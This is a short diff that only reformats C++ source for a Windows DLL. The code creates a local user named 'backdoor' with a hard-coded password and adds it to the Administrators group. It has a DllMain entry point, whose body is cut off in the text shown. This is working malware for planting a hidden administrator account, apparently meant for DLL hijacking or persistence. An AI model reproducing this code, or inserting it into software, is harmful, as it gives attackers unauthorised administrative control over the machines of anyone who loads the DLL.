@@ -2,17 +2,17 @@
 #include <iostream>
 #include <windows.h>
 #include <LM.h>
-#pragma comment(lib,"Netapi32.lib")
+#pragma comment(lib, "Netapi32.lib")
 using namespace std;
 wstring name = L"backdoor";
-LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
+LPWSTR lpName = const_cast<wchar_t *>(name.c_str());
 wstring password = L"localadmin123!";
-LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
+LPWSTR lpPassword = const_cast<wchar_t *>(password.c_str());
 DWORD adduserStatus;
 USER_INFO_1 userinfo;
 
-
-int backDoor(USER_INFO_1 userinfo) {
+int backDoor(USER_INFO_1 userinfo)
+{
 	userinfo.usri1_name = lpName;
 	userinfo.usri1_password = lpPassword;
 	userinfo.usri1_password_age = 0;
@@ -28,22 +28,19 @@ int backDoor(USER_INFO_1 userinfo) {
 	if (adduserStatus)
 	{
 		return adduserStatus;
-
 	}
-	adduserStatus = NetLocalGroupAddMembers(NULL, ((wstring) L"Administrators").c_str(), 3, (LPBYTE)&localgroupinfo, 1);
+	adduserStatus = NetLocalGroupAddMembers(NULL, ((wstring)L"Administrators").c_str(), 3, (LPBYTE)&localgroupinfo, 1);
 	if (adduserStatus)
 	{
 		return adduserStatus;
 	}
 
 	return 0;
-
 };
 
 BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD  ul_reason_for_call,
-	LPVOID lpReserved
-)
+					  DWORD ul_reason_for_call,
+					  LPVOID lpReserved)
 {
 	switch (ul_reason_for_call)
 	{
